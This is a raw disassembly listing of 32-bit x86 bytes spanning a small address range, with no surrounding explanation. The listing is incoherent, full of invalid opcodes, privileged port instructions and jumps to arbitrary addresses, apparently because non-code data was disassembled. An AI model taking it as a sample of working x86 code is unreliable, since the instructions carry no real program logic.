  41e208:	(bad)  [esi-0x442f4657]
  41e20e:	(bad)  
  41e210:	pop    ebp
  41e211:	shr    DWORD PTR [ebx],1
  41e213:	cmp    ch,BYTE PTR [edx+0x620c6d03]
  41e219:	cmp    eax,0xf50af731
  41e21e:	jmp    0x41e224
  41e220:	jb     0x41e236
  41e222:	ja     0x41e23e
  41e224:	add    dh,ah
  41e226:	fwait
  41e227:	mov    al,ds:0x83f7e8fe
  41e22c:	jnp    0x41e21f
  41e22e:	test   DWORD PTR [ecx+0x772871e],0x9366066
  41e238:	or     eax,0x56
	...
  41e251:	add    BYTE PTR [eax],al
  41e253:	mov    bh,0x4
  41e255:	(bad)  
  41e256:	lods   al,BYTE PTR ds:[esi]
  41e257:	push   cs
  41e258:	add    eax,0xfeb67066
  41e25d:	or     al,0x6d
  41e25f:	mov    bl,0xf
  41e261:	std    
  41e262:	jmp    0xf1903c65
  41e267:	xchg   DWORD PTR [edi+0x24c4de50],edi
  41e26d:	adc    BYTE PTR [ecx],ch
  41e26f:	lock add eax,0x55
  41e273:	mov    cl,0xc0
  41e275:	addr16 adc ecx,esi
  41e278:	add    al,0x0
  41e27a:	mov    esi,0x2f8b0884
  41e27f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e280:	ror    BYTE PTR [edx+0x50b50024],0x91
  41e287:	(bad)  
  41e288:	cmp    eax,0x2d29efd
  41e28d:	xor    DWORD PTR [ecx+0x640fc768],ebp
  41e293:	mov    bh,0x1
  41e295:	test   ch,dh
  41e297:	lock add al,0x0
  41e29a:	jb     0x41e318
  41e29c:	or     BYTE PTR [esi+0x62],ah
  41e29f:	add    cl,BYTE PTR ss:0x66083d36
  41e2a6:	sub    BYTE PTR [edi],bl
  41e2a8:	push   es
  41e2a9:	mov    BYTE PTR [edi+0x29b60127],ah
  41e2af:	out    dx,al
  41e2b0:	popa   
  41e2b1:	mov    edi,0xa7fc3560
	...
  41e2ce:	add    BYTE PTR [eax],al
  41e2d0:	push   ds
  41e2d1:	add    BYTE PTR [ebx],0x83
  41e2d4:	lods   eax,DWORD PTR ds:[esi]
  41e2d5:	idiv   DWORD PTR [esi-0x40]
  41e2d8:	or     DWORD PTR [ecx+0x42970c46],eax
  41e2de:	or     ecx,DWORD PTR [ebp+0x3852433]
  41e2e4:	xchg   DWORD PTR [edx+0xb],eax
  41e2e7:	mov    BYTE PTR [ebx+0x29],cl
  41e2ea:	ret    
  41e2eb:	inc    esi
  41e2ec:	mov    edi,0x72836603
  41e2f1:	std    
  41e2f2:	pop    es
  41e2f3:	cmovs  eax,esp
  41e2f6:	xchg   DWORD PTR [esi-0x52],eax
  41e2f9:	aaa    
  41e2fa:	(bad)  
  41e2fb:	je     0x41e374
  41e2fd:	cli    
  41e2fe:	mov    dl,0x47
  41e300:	ret    
  41e301:	mov    al,bh
  41e303:	adc    BYTE PTR [eax],ch
  41e305:	push   ss
  41e306:	les    eax,FWORD PTR [ebp-0x2b]
  41e309:	add    edi,DWORD PTR [eax+eax*1-0x63]
  41e30d:	les    eax,FWORD PTR [eax-0x8]
  41e310:	mov    ebp,0x5a000009
  41e315:	dec    edi
  41e316:	icebp  
  41e317:	pop    ds
  41e318:	lea    eax,[ebx]
  41e31a:	add    bl,ch
  41e31c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e31d:	mov    al,bh
  41e31f:	and    al,ch
  41e321:	pop    ds
  41e322:	les    eax,FWORD PTR [ebp-0x7b]
  41e325:	add    eax,DWORD PTR [eax]
  41e327:	dec    DWORD PTR [ebp+0x5df840c4]
  41e32d:	in     al,dx
  41e32e:	(bad)  
  41e32f:	call   FWORD PTR [edx+0xfff14f]
	...
  41e34d:	dec    ebp
  41e34e:	add    eax,DWORD PTR [eax]
  41e350:	lea    ecx,[ebx]
  41e352:	pop    ds
  41e353:	dec    ebp
  41e354:	lea    ebx,[ebx]
  41e356:	and    eax,0xfb988b4d
  41e35b:	out    0xd4,eax
  41e35d:	mov    ds:0xf48dfaed,eax
  41e362:	pop    edi
  41e363:	in     al,dx
  41e364:	dec    edi
  41e365:	and    DWORD PTR [edi-0x21],0x19607f4f
  41e36c:	call   0xfd58b2a9
  41e371:	imul   ebx,DWORD PTR [edi-0x1b],0xe967814f
  41e378:	dec    edi
  41e379:	jg     0x41e3db
  41e37b:	or     eax,0x16ef48e8
  41e380:	std    
  41e381:	mov    cs,WORD PTR ds:0x2d3a8ab4
  41e387:	mov    cl,0xe7
  41e389:	pushf  
  41e38a:	sbb    eax,DWORD PTR [edx]
  41e38c:	add    BYTE PTR [esi+0x66],ch
  41e38f:	rol    DWORD PTR [edi-0x4af7a2ce],1
  41e395:	cmp    ah,BYTE PTR [edx]
  41e397:	or     BYTE PTR [ebp+0x463f1832],ch
  41e39d:	or     BYTE PTR ds:0x2140c07e,bl
  41e3a3:	sub    DWORD PTR [esi],ebx
  41e3a5:	neg    DWORD PTR [ecx+eax*1]
  41e3a8:	xchg   DWORD PTR [edx],esi
  41e3aa:	and    al,0x7e
  41e3ac:	shr    BYTE PTR [eax],0x36
  41e3af:	sbb    BYTE PTR [esi+0x0],dh
	...
  41e3ca:	add    al,0x57
  41e3cc:	iret   
  41e3cd:	cld    
  41e3ce:	jmp    0xf481d45e
  41e3d3:	xchg   esp,eax
  41e3d4:	mov    esi,0x8d5c7903
  41e3d9:	add    esi,DWORD PTR [edx-0x3500e91f]
  41e3df:	and    edi,0x0
  41e3e2:	cmc    
  41e3e3:	sbb    eax,DWORD PTR [ecx-0x71e39c85]
  41e3e9:	push   cs
  41e3ea:	pop    ebx
  41e3eb:	push   cs
  41e3ec:	icebp  
  41e3ed:	cld    
  41e3ee:	jmp    0xf481d572
  41e3f3:	add    al,0xbd
  41e3f5:	sub    ebp,ebx
  41e3f7:	add    eax,ebp
  41e3f9:	add    eax,DWORD PTR ds:0xd1416217
  41e3ff:	scas   al,BYTE PTR es:[edi]
  41e400:	mov    cl,0x4a
  41e402:	ss or  edi,esp
  41e405:	sbb    BYTE PTR [edx+0x18d13e08],ch
  41e40b:	clc    
  41e40c:	jbe    0x41e401
  41e40e:	rol    DWORD PTR [esi+ebp*1],cl
  41e411:	xchg   ecx,eax
  41e412:	sti    
  41e413:	or     eax,0xc4e437fc
  41e418:	out    0x18,al
  41e41a:	xor    al,0xfe
  41e41d:	adc    al,0xf6
  41e41f:	add    esp,edi
  41e421:	sbb    BYTE PTR [edx-0x13],ah
  41e424:	push   cs
  41e425:	sub    eax,0x18e703f6
  41e42a:	(bad)  
  41e42b:	leave  
  41e42c:	(bad)  
  41e42d:	and    al,0x0
	...
  41e447:	test   BYTE PTR [ebx],0xe7
  41e44a:	mov    cl,0xd3
  41e44c:	xor    cl,ch
  41e44e:	add    al,0xf4
  41e450:	inc    ecx
  41e451:	xor    al,0x8b
  41e453:	enter  0x3cb3,0x17
  41e457:	daa    
  41e458:	add    esi,ecx
  41e45a:	icebp  
  41e45b:	mov    bh,0xf2
  41e45d:	es add al,0x6d
  41e460:	adc    al,0x4
  41e462:	add    al,0xf4
  41e464:	or     eax,0x43c28ae7
  41e469:	shl    ah,0xfc
  41e46c:	inc    ebx
  41e46d:	jb     0x41e4b5
  41e46f:	add    esp,DWORD PTR [edi+eiz*8]
  41e472:	push   ss
  41e473:	hlt    
  41e474:	add    al,0x62
  41e476:	cs mov bl,0x22
  41e479:	test   DWORD PTR [edx],0xc8f433e
  41e47f:	mov    ds:0x9b0aef23,eax
  41e484:	jnp    0x41e486
  41e486:	sub    al,0xec
  41e488:	call   0x6650:0x9355c03
  41e48f:	gs add eax,0xfc45ee8
  41e495:	std    
  41e496:	ins    DWORD PTR es:[edi],dx
  41e497:	mov    eax,0xfa641798
  41e49c:	cwde   
  41e49d:	setg   BYTE PTR [edx]
  41e4a0:	xchg   edx,eax
  41e4a1:	or     edi,DWORD PTR [esi]
  41e4a3:	test   DWORD PTR ds:0xf8442e8,eax
  41e4a9:	std    
  41e4aa:	add    BYTE PTR gs:[eax],al
	...
  41e4c1:	add    BYTE PTR [eax],al
  41e4c3:	add    BYTE PTR [eax-0x6a6fc68],dh
  41e4c9:	sbb    eax,DWORD PTR [edx]
  41e4cb:	(bad)  [edi+0x2bc6ae]
  41e4d1:	add    eax,0x8c1c6253
  41e4d6:	jmp    0x41e45d
  41e4d8:	cmc    
  41e4d9:	add    al,0x0
  41e4db:	call   0x7da2:0x9f0bb06e
  41e4e2:	jnp    0x41e4c5
  41e4e4:	popf   
  41e4e5:	add    BYTE PTR [eax-0x13],ch
  41e4e8:	jb     0x41e4b6
  41e4ea:	push   DWORD PTR ds:0xd6945008
  41e4f0:	or     al,BYTE PTR [ecx+0xa2bdec0]
  41e4f6:	add    eax,0x3f9cf7e9
  41e4fb:	ss lahf 
  41e4fd:	or     al,0x67
  41e4ff:	in     eax,0x7c
  41e501:	enter  0x19c7,0xd8
  41e505:	and    DWORD PTR [ecx-0x3f7f155a],edx
  41e50b:	out    dx,al
  41e50c:	sti    
  41e50d:	and    DWORD PTR ds:0x39ef7e9,eax
  41e513:	xor    DWORD PTR [eax-0x5affb481],esp
  41e519:	push   ecx
  41e51a:	mov    dh,0x14
  41e51c:	bound  ecx,QWORD PTR [eax-0x3]
  41e51f:	out    0x7e,eax
  41e521:	jecxz  0x41e522
  41e523:	call   eax
  41e525:	(bad)  
  41e526:	or     al,BYTE PTR [ebp+0x0]
	...
  41e540:	add    BYTE PTR [eax],cl
  41e542:	or     edi,ebp
  41e544:	inc    ebp
  41e546:	inc    esp
  41e547:	int3   
  41e548:	mov    BYTE PTR [eax-0x29],ah
  41e54b:	mov    BYTE PTR [ebp-0x46],bh
  41e54e:	jl     0x41e591
  41e550:	int3   
  41e551:	(bad)
  41e554:	add    BYTE PTR ds:0x98e5797d,cl
  41e55a:	inc    esp
  41e55b:	int    0xe8
  41e55d:	test   DWORD PTR [edx],ecx
  41e55f:	std    
  41e560:	dec    DWORD PTR [edx]
  41e562:	mov    edx,0xba0ae540
  41e567:	dec    eax
  41e568:	inc    DWORD PTR [ebx+0x7308dfc0]
  41e56e:	(bad)  
  41e56f:	mov    esp,0xc8220f
  41e574:	std    
  41e575:	fyl2x  
  41e577:	cli    
  41e578:	mov    ecx,0x6dd
  41e57d:	jae    0x41e5ad
  41e57f:	mov    esi,0x37d520f
  41e584:	add    ch,cl
  41e586:	jl     0x41e58f
  41e588:	add    DWORD PTR [eax-0x27],0xffffffff
  41e58c:	xor    bh,BYTE PTR [edx-0x2d17be7d]
  41e592:	push   eax
  41e593:	mov    dl,BYTE PTR [ebp-0x57]
  41e596:	jg     0x41e611
  41e598:	in     al,dx
  41e599:	dec    edx
  41e59a:	push   ebp
  41e59b:	add    DWORD PTR [ebx-0x37792330],ecx
  41e5a1:	push   es
  41e5a2:	sar    DWORD PTR [edx+ebp*8+0x0],1
	...
  41e5bd:	add    BYTE PTR [ebp-0x7a],bh
  41e5c0:	fld    QWORD PTR [eax]
  41e5c2:	hlt    
  41e5c3:	sbb    eax,0x67ff0014
  41e5c8:	xchg   eax,edx
  41e5ca:	mov    ds:0xf400141d,al
  41e5cf:	sub    edi,DWORD PTR ds:[edi-0x2ff7d2ac]
  41e5d6:	fisub  WORD PTR [ecx]
  41e5d8:	xchg   BYTE PTR [ebx+0x54],al
  41e5db:	fsubr  QWORD PTR [eax]
  41e5dd:	or     BYTE PTR ds:0x33500bbf,dh
  41e5e3:	sub    BYTE PTR [ecx],cl
  41e5e5:	or     DWORD PTR [esi],edi
  41e5e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5e8:	(bad)  
  41e5e9:	fisttp WORD PTR [esi+ecx*8]
  41e5ec:	outs   dx,BYTE PTR ds:[esi]
  41e5ed:	std    
  41e5ee:	sbb    esp,DWORD PTR [ecx-0x61078cbd]
  41e5f4:	(bad)  
  41e5f5:	jmp    0x41e602
  41e5f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5f8:	mov    esp,0x3f577eb
  41e5fd:	or     eax,0xfffc0b70
  41e602:	repz fs add al,0x83
  41e606:	push   ss
  41e607:	and    eax,DWORD PTR [ecx]
  41e609:	add    BYTE PTR [esp+ebx*2-0x74],cl
  41e60d:	sbb    ah,dh
  41e60f:	jb     0x41e599
  41e611:	jnp    0x41e60f
  41e613:	mov    al,ds:0x424fcbc
  41e618:	or     al,0x91
  41e61a:	ret    
  41e61b:	and    edi,DWORD PTR [ebp-0x40]
  41e61e:	jmp    0x41e5bf
  41e620:	or     BYTE PTR ds:0x0,al
	...
  41e63a:	add    ah,dh
  41e63c:	sbb    eax,DWORD PTR [ecx-0x77e35485]
  41e642:	or     ebx,esi
  41e644:	test   al,0x3e
  41e646:	std    
  41e647:	inc    edi
  41e648:	adc    al,0x7d
  41e64a:	rol    BYTE PTR [ebx],0x98
  41e64d:	or     al,0x6
  41e64f:	hlt    
  41e650:	sbb    ecx,DWORD PTR [eax+0xc057709]
  41e656:	and    al,0xf4
  41e658:	ja     0x41e67e
  41e65a:	mov    esp,es
  41e65c:	ja     0x41e69a
  41e65e:	and    al,0x69
  41e660:	mov    dh,0xda
  41e662:	mov    BYTE PTR [eax+eax*4],ch
  41e665:	mov    al,0x4
  41e667:	jo     0x41e698
  41e669:	in     eax,0x3
  41e66b:	hlt    
  41e66c:	or     esp,edi
  41e66e:	repz jle 0x41e631
  41e671:	pop    esi
  41e672:	sub    eax,edi
  41e674:	or     BYTE PTR [esi+0x14],ah
  41e677:	ins    DWORD PTR es:[edi],dx
  41e678:	sub    eax,0x81013864
  41e67d:	sub    al,0xfd
  41e67f:	sub    ecx,DWORD PTR [edx]
  41e681:	dec    esi
  41e682:	mov    es,WORD PTR [ebx+0xa]
  41e685:	fdivr  QWORD PTR [edi]
  41e687:	push   es
  41e688:	(bad)
  41e68b:	dec    edx
  41e68c:	mov    esi,0xa30c88df
  41e691:	popa   
  41e692:	sar    bl,0xa2
  41e695:	daa    
  41e696:	and    ebp,esp
  41e698:	mov    ds:0x7c5a42f1,al
  41e69d:	lods   al,BYTE PTR ds:[esi]
  41e69e:	ja     0x41e6a0
	...
  41e6b8:	push   edx
  41e6b9:	jle    0x41e665
  41e6bb:	or     ecx,esi
  41e6bd:	push   edx
  41e6be:	mov    dl,0x8
  41e6c0:	push   edx
  41e6c1:	inc    esp
  41e6c2:	pop    es
  41e6c3:	or     ebx,DWORD PTR [edx-0x2]
  41e6c6:	daa    
  41e6c7:	popf   
  41e6c8:	jb     0x41e689
  41e6ca:	dec    esp
  41e6cb:	mov    BYTE PTR [ecx-0x46fc1921],bh
  41e6d1:	add    al,0x72
  41e6d3:	inc    ebx
  41e6d4:	jae    0x41e6f1
  41e6d6:	idiv   esi
  41e6d8:	push   0x7d
  41e6da:	sahf   
  41e6db:	inc    ebp
  41e6dc:	ret    
  41e6dd:	hlt    
  41e6de:	jno    0x41e71b
  41e6e0:	aad    0x32
  41e6e2:	repnz cmp eax,0xe1001c53
  41e6e8:	xor    BYTE PTR [edx],ch
  41e6ea:	or     dl,ah
  41e6ec:	cmp    BYTE PTR [edx-0x6a5a6bd],al
  41e6f2:	mov    ch,BYTE PTR [edx]
  41e6f4:	pop    eax
  41e6f5:	mov    ecx,0xb4d02c8a
  41e6fa:	out    0x82,eax
  41e6fc:	clc    
  41e6fd:	or     ebp,edi
  41e6ff:	cmpxchg ebp,eax
  41e702:	mov    ds:0x434a9df1,eax
  41e707:	dec    edi
  41e708:	dec    eax
  41e709:	lahf   
  41e70a:	mov    esi,0x69fca024
  41e70f:	add    DWORD PTR [ebp-0x3b],esi
  41e712:	fwait
  41e713:	mov    ecx,0x41079606
  41e718:	cli    
  41e719:	jbe    0x41e718
  41e71b:	dec    esi
	...
  41e734:	add    BYTE PTR [esp+eax*2+0xd],ch
  41e738:	ins    DWORD PTR es:[edi],dx
  41e739:	cmp    bh,bh
  41e73b:	(bad)  
  41e73c:	call   0xddb5eebd
  41e741:	dec    esi
  41e742:	or     BYTE PTR [ebx+0x49],dh
  41e745:	out    0x95,eax
  41e747:	pop    es
  41e748:	adc    edx,edx
  41e74a:	jbe    0x41e749
  41e74c:	push   ds
  41e74d:	jl     0x41e794
  41e74f:	or     eax,0x2e06d
  41e754:	jmp    0xdf91b3bb
  41e759:	mov    bh,0x8
  41e75b:	mov    ch,0xfe
  41e75d:	out    0x4,al
  41e75f:	add    BYTE PTR [edi],dh
  41e761:	out    0x4,eax
  41e763:	add    cl,ch
  41e765:	inc    edx
  41e766:	cmp    eax,0xc4394f56
  41e76b:	fsubr  DWORD PTR [esp+edi*2+0x7d]
  41e76f:	(bad)  
  41e770:	(bad)  
  41e771:	push   es
  41e772:	fwait
  41e773:	(bad)  
  41e774:	cmp    BYTE PTR [esi],ch
  41e776:	(bad)  
  41e777:	xlat   BYTE PTR ds:[ebx]
  41e778:	add    BYTE PTR [ebp+0x544d865e],cl
  41e77e:	repz rcl BYTE PTR [esi-0x72],cl
  41e782:	out    dx,al
  41e783:	mov    BYTE PTR [ebp-0x50aeb],al
  41e789:	mov    ebx,0xded7fc50
  41e78e:	mov    edi,0xf9088917
  41e793:	test   BYTE PTR [ebp-0x1f],dh
  41e796:	jle    0x41e811
  41e798:	clc    
	...
  41e7b1:	add    BYTE PTR [ebp+0x3],cl
  41e7b4:	xchg   cl,bl
  41e7b6:	pop    ebp
  41e7b7:	add    al,0x0
  41e7b9:	push   0x5d
  41e7bb:	ins    BYTE PTR es:[edi],dx
  41e7bc:	sub    DWORD PTR [ecx],eax
  41e7be:	dec    ebp
  41e7bf:	add    al,0x89
  41e7c1:	inc    ebp
  41e7c2:	inc    ebp
  41e7c3:	push   esp
  41e7c4:	xor    al,al
  41e7c6:	lds    esp,FWORD PTR [esi+0x7ec2ff93]
  41e7cc:	clc    
  41e7cd:	inc    DWORD PTR [edx+0x7d]
  41e7d0:	mov    esi,0xfb040d00
  41e7d5:	adc    eax,0x3d0ce1
  41e7da:	add    BYTE PTR [eax+0x24],cl
  41e7dd:	add    BYTE PTR ds:0x8898103,cl
  41e7e3:	add    al,0x0
  41e7e5:	adc    DWORD PTR [eax-0x298c02f1],0x69
  41e7ec:	cld    
  41e7ed:	dec    DWORD PTR [eax-0x2eea03f1]
  41e7f3:	push   cs
  41e7f4:	cmp    eax,0x93d4600
  41e7f9:	mov    edx,ebp
  41e7fb:	repnz dec edi
  41e7fd:	adc    BYTE PTR [esi+0x75],dl
  41e800:	cmc    
  41e801:	sub    DWORD PTR [eax],0x11
  41e804:	std    
  41e805:	test   dl,dl
  41e807:	ins    BYTE PTR es:[edi],dx
  41e808:	outs   dx,BYTE PTR ds:[esi]
  41e809:	xor    esp,0xffffffb8
  41e80c:	sbb    eax,DWORD PTR [eax]
  41e80e:	getsec 
  41e810:	stc    
  41e811:	mov    BYTE PTR [ecx],dh
  41e813:	xor    bh,BYTE PTR [ebx+0x4b]
	...
  41e82e:	add    BYTE PTR [eax+ebx*4-0x64ee0129],bl
  41e835:	xchg   ecx,eax
  41e836:	add    dh,ah
  41e838:	iret   
  41e839:	mov    edx,0x6df7765
  41e83e:	add    dl,ch
  41e840:	loope  0x41e7fb
  41e842:	cld    
  41e843:	loope  0x41e86a
  41e845:	jl     0x41e808
  41e847:	dec    esp
  41e848:	xchg   esi,eax
  41e849:	push   ss
  41e84a:	std    
  41e84b:	pop    ebx
  41e84c:	call   0x2ea:0xa203fd0b
  41e853:	hlt    
  41e854:	sbb    eax,0xa1f3c086
  41e859:	repnz add dh,ah
  41e85c:	sbb    eax,0x30f5f884
  41e861:	in     al,0x88
  41e863:	mov    cl,0xd
  41e865:	sar    DWORD PTR [eax],0xb9
  41e868:	mov    ch,0x94
  41e86a:	adc    DWORD PTR [ebx],ebx
  41e86c:	push   eax
  41e86d:	or     DWORD PTR [ecx-0x3283ebdd],eax
  41e873:	jns    0x41e8bd
  41e875:	sbb    eax,0x3d742e8
  41e87a:	add    BYTE PTR [edi],cl
  41e87c:	adc    eax,0xf44a069b
  41e881:	call   0x443:0x101bf4ff
  41e888:	mov    ds:0x59770fc4,eax
  41e88d:	sbb    DWORD PTR [edi],eax
  41e88f:	punpcklwd mm1,DWORD PTR [ecx]
  41e892:	jb     0x41e894
	...
  41e8ac:	bound  ebx,QWORD PTR [ebx+0x26f4138c]
  41e8b2:	test   DWORD PTR [ecx],ebp
  41e8b4:	mov    ebx,0xb110e605
  41e8b9:	nop
  41e8ba:	repnz adc BYTE PTR [edi],al
  41e8bd:	std    
  41e8be:	stc    
  41e8bf:	ret    
  41e8c0:	mov    ds:0x9910ec1d,eax
  41e8c5:	push   es
  41e8c6:	jb     0x41e856
  41e8c8:	sti    
  41e8c9:	pushf  
  41e8ca:	es cdq 
  41e8cc:	in     al,dx
  41e8cd:	add    al,0x41
  41e8cf:	add    ebp,DWORD PTR [edi-0x40]
  41e8d2:	lods   eax,DWORD PTR ds:[esi]
  41e8d3:	mov    bl,0x93
  41e8d5:	pop    ds
  41e8d6:	ja     0x41e8e8
  41e8d8:	jno    0x41e85b
  41e8da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8db:	add    BYTE PTR [eax+0x44],dh
  41e8de:	jmp    0x41e8e3
  41e8e0:	hlt    
  41e8e1:	cmc    
  41e8e2:	push   esp
  41e8e3:	(bad)  
  41e8e4:	pop    eax
  41e8e5:	or     BYTE PTR [edi-0x247efefd],0x7
  41e8ec:	hlt    
  41e8ed:	add    al,0x1f
  41e8ef:	mov    esp,0x5a480f0
  41e8f4:	hlt    
  41e8f5:	add    al,0xaf
  41e8f7:	add    BYTE PTR [eax-0x28],bh
  41e8fa:	call   0xe5fedd02
  41e8ff:	xchg   DWORD PTR [edi],ebp
  41e901:	add    al,0xe7
  41e903:	add    ebp,DWORD PTR [ebp+esi*8+0x4f4646a]
  41e90a:	out    0xbb,eax
  41e90c:	clc    
  41e90d:	jg     0x41e966
  41e90f:	pop    es
	...
  41e928:	add    ah,dh
  41e92a:	add    al,0xbf
  41e92c:	ret    
  41e92d:	sub    cl,0xe6
  41e930:	popf   
  41e931:	hlt    
  41e932:	ja     0x41e8d8
  41e934:	jae    0x41e97a
  41e936:	sbb    eax,0x5e17374
  41e93b:	arpl   WORD PTR [ebx-0x17],ax
  41e93e:	cmp    BYTE PTR [edi+0x7],0xf4
  41e942:	add    al,0x8f
  41e944:	ret    
  41e945:	inc    eax
  41e946:	jmp    0xa48b:0x161e8ff
  41e94d:	xor    esi,DWORD PTR [ebp+0x8286ce7]
  41e953:	std    
  41e954:	gs xor al,bh
  41e957:	or     DWORD PTR [ecx-0x14],0x4
  41e95b:	add    BYTE PTR [edx-0x4b],ah
  41e95e:	inc    ecx
  41e95f:	mov    DWORD PTR [eax-0x4102fa63],ebp
  41e965:	lock jnp 0x41e937
  41e968:	test   al,0xde
  41e96a:	hlt    
  41e96b:	or     BYTE PTR [ebx-0x7440ca01],ch
  41e971:	push   0xfae9de86
  41e976:	add    al,0x0
  41e978:	loop   0x41e9a2
  41e97a:	inc    esi
  41e97b:	call   0x8649a61
  41e980:	repnz mov ch,0x7d
  41e983:	inc    ebx
  41e984:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e985:	xor    al,bh
  41e987:	add    eax,0xfffffffb
  41e98a:	add    al,0x0
  41e98c:	add    DWORD PTR [eax],0x0
	...
  41e9a6:	pop    edi
  41e9a7:	pop    es
  41e9a8:	add    cl,ch
  41e9aa:	scas   al,BYTE PTR es:[edi]
  41e9ab:	adc    al,0x83
  41e9ad:	push   edi
  41e9ae:	sub    eax,DWORD PTR [ecx+0x4f7ed1a]
  41e9b4:	push   0xffec82a9
  41e9b9:	inc    ebp
  41e9ba:	ins    DWORD PTR es:[edi],dx
  41e9bb:	inc    ecx
  41e9bc:	push   esi
  41e9bd:	push   ecx
  41e9be:	and    BYTE PTR [ebp-0x3],dh
  41e9c1:	ss ins BYTE PTR es:[edi],dx
  41e9c3:	inc    esp
  41e9c4:	or     eax,0xff65
  41e9c9:	jmp    0x724e323c
  41e9ce:	lods   eax,DWORD PTR ds:[esi]
  41e9cf:	enter  0xe188,0xa9
  41e9d3:	add    DWORD PTR [eax-0x13],edx
  41e9d6:	mov    eax,ds:0xfb006bec
  41e9db:	or     BYTE PTR [eax],al
  41e9dd:	jmp    0x3cfc62
  41e9e2:	push   esi
  41e9e3:	xchg   esi,eax
  41e9e4:	add    al,0x68
  41e9e6:	lea    ebx,[ebx+0xe470017]
  41e9ec:	mov    DWORD PTR [ebp-0x33],eax
  41e9ef:	mov    eax,0x131afee4
  41e9f4:	sti    
  41e9f5:	test   BYTE PTR [ebp+0x3],cl
  41e9f8:	sbb    ecx,0x6600089e
  41e9fe:	pop    esp
  41e9ff:	int    0xed
  41ea01:	or     BYTE PTR [ebx],dh
  41ea03:	dec    edx
  41ea04:	inc    ecx
  41ea05:	repz xchg ebp,eax
  41ea07:	sahf   
  41ea08:	adc    esi,DWORD PTR [ebx]
	...
  41ea22:	add    BYTE PTR [edx+0x5d800052],bl
  41ea28:	or     bl,bh
  41ea2a:	adc    eax,0x3cfbc5
  41ea2f:	rol    BYTE PTR [edi+0x66],1
  41ea32:	mov    esp,DWORD PTR [eax]
  41ea34:	xor    cl,BYTE PTR [ebx]
  41ea36:	xchg   ebp,eax
  41ea37:	adc    al,bh
  41ea39:	bound  edi,QWORD PTR [ecx]
  41ea3b:	adc    BYTE PTR [edx],bl
  41ea3d:	jno    0x41ea49
  41ea3f:	repz jg 0x41ea83
  41ea42:	fild   DWORD PTR [ebx-0x2f]
  41ea45:	inc    ecx
  41ea46:	repz inc ecx
  41ea48:	or     eax,0x78d01be
  41ea4d:	add    BYTE PTR [edx+0x4d8a3050],cl
  41ea53:	int    0x7d
  41ea55:	rol    BYTE PTR [eax-0x1d7ff744],1
  41ea5b:	or     al,0xce
  41ea5d:	(bad)  
  41ea5e:	je     0x41ea53
  41ea60:	mov    esp,es
  41ea62:	je     0x41ea50
  41ea64:	(bad)  
  41ea65:	lds    edi,FWORD PTR [eax]
  41ea67:	cwde   
  41ea68:	test   BYTE PTR [ebx],0x94
  41ea6b:	hlt    
  41ea6c:	sub    al,0xbc
  41ea6e:	adc    ch,0xeb
  41ea71:	cmp    DWORD PTR [edi+0x30fe16f6],0x10bfc5bd
  41ea7b:	repz popa 
  41ea7d:	inc    esp
  41ea7e:	inc    edi
  41ea7f:	ja     0x41ea8d
  41ea81:	std    
  41ea82:	xor    BYTE PTR [ebp+0xeef7f1],0x0
	...
  41ea9d:	add    BYTE PTR [eax],al
  41ea9f:	add    BYTE PTR [esi+0x30],bh
  41eaa2:	adc    al,0x8a
  41eaa4:	les    ebp,FWORD PTR [ebp+0x21]
  41eaa7:	add    al,0x74
  41eaa9:	iret   
  41eaaa:	pop    es
  41eaab:	cmp    bh,BYTE PTR [esi-0x427c19bf]
  41eab1:	cmp    ecx,esi
  41eab3:	xor    BYTE PTR [ebp-0x14ef420b],ch
  41eab9:	pop    ecx
  41eaba:	inc    ecx
  41eabb:	inc    edi
  41eabc:	ja     0x41ea4a
  41eabe:	or     DWORD PTR [ecx+0xd17f535],eax
  41eac4:	daa    
  41eac5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eac6:	retf   
  41eac7:	dec    edx
  41eac8:	pop    es
  41eac9:	jecxz  0x41eb3f
  41eacb:	mov    edi,0xf4216ebd
  41ead0:	ja     0x41ea7e
  41ead2:	repz or BYTE PTR [ebp+0x67],al
  41ead6:	mov    ebp,0x18c74ef
  41eadb:	and    al,0xf6
  41eadd:	daa    
  41eade:	cmp    al,0x74
  41eae0:	add    al,0x1f
  41eae2:	inc    esp
  41eae3:	test   BYTE PTR ds:0xacc074ea,ch
  41eae9:	outs   dx,BYTE PTR ds:[esi]
  41eaea:	and    al,0xe0
  41eaec:	ja     0x41eb1b
  41eaee:	les    ecx,FWORD PTR [eax]
  41eaf0:	add    al,0x3b
  41eaf2:	(bad)
  41eaf5:	sar    ecx,0x69
  41eaf8:	jl     0x41eb66
  41eafa:	ds add ah,bh
  41eafd:	add    al,0xe7
  41eaff:	add    ecx,DWORD PTR [ecx-0x5]
  41eb02:	mov    ds:0x13,eax
	...
  41eb1b:	add    BYTE PTR [eax],al
  41eb1d:	add    al,0x79
  41eb1f:	loopne 0x41eaba
  41eb21:	jae    0x41eaa7
  41eb23:	sbb    al,0x4
  41eb25:	cld    
  41eb26:	add    al,0xe7
  41eb28:	lods   al,BYTE PTR ds:[esi]
  41eb29:	pop    ebp
  41eb2a:	or     BYTE PTR [edi+eax*8-0x2d],ch
  41eb2e:	push   ebp
  41eb2f:	fs (bad) 
  41eb31:	mov    ds:0xaf69ff55,eax
  41eb36:	add    eax,0x4860fce7
  41eb3b:	fidiv  DWORD PTR [ebx+esi*1-0x753961ee]
  41eb42:	push   ebp
  41eb43:	(bad)  
  41eb44:	(bad)  
  41eb45:	dec    DWORD PTR [ebp+0x2a278ee]
  41eb4b:	pop    ss
  41eb4c:	in     al,dx
  41eb4d:	call   0x2b8e:0x790cb417
  41eb54:	cld    
  41eb55:	fild   DWORD PTR [esi+ebx*1-0x17]
  41eb59:	imul   ebp,DWORD PTR [esi+eiz*8+0x7e],0xffffffb7
  41eb5e:	cwde   
  41eb5f:	ss sbb al,0x3d
  41eb62:	xchg   ebx,eax
  41eb63:	lea    ecx,[eax+edi*2]
  41eb66:	(bad)
  41eb69:	add    BYTE PTR [edi],0xe7
  41eb6c:	add    esi,DWORD PTR [eax+eax*4+0x5b]
  41eb70:	add    ebp,ecx
  41eb72:	xchg   edi,eax
  41eb73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb74:	cld    
  41eb75:	imul   eax,ebp,0x99b778b6
